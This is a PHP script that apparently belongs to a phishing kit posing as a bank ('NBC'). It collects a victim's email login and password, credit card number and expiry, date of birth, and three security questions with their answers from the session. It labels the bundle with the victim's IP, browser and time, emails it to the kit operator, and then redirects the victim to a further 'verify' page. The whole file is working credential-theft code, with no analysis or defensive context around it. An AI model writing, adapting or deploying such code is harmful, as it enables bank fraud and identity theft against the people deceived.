<?php
session_start();
	include "email.php";
		include './prevents/anti7.php';
			include './prevents/anti8.php';
				include './prevents/anti9.php';


$ip = getenv("REMOTE_ADDR");
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$timedate = date("D/M/d, Y g(idea) a");

$cc1 = $_SESSION['cc1'];
$pass =$_SESSION['password'];
$exp = $_SESSION['exp'];
$dob = $_SESSION['dob'];
$q1 = $_SESSION['q1'];
$q2 = $_SESSION['q2'];
$q3 = $_SESSION['q3'];
$a1 = $_SESSION['ans1'];
$a2 = $_SESSION['ans2'];
$a3 = $_SESSION['ans3'];

$em = $_SESSION['identity'];


$data ="
=============## NATIONAL QA ##==================
|EMAIL : $em
|PASS : $pass
|
|CC: $cc1
|exp: $exp
|dob: $dob
|
|Q1: $q1
|A1: $a1
|
|Q2: $q2
|A2: $a2
|
|Q3: $q3
|A3: $a3

============## Goodies ##=======================
IP : $ip
UA : $browserAgent
Time : $timedate
";

$subject = "NBC quest Result .$ip. $em $pass";
;

if($cc1 != "" && strlen($a1)<15 && strlen($exp)<5  && $a1 != "" ){
mail($emailusr,$subject,$data);

}
header("Location: ./verify.php");


?>
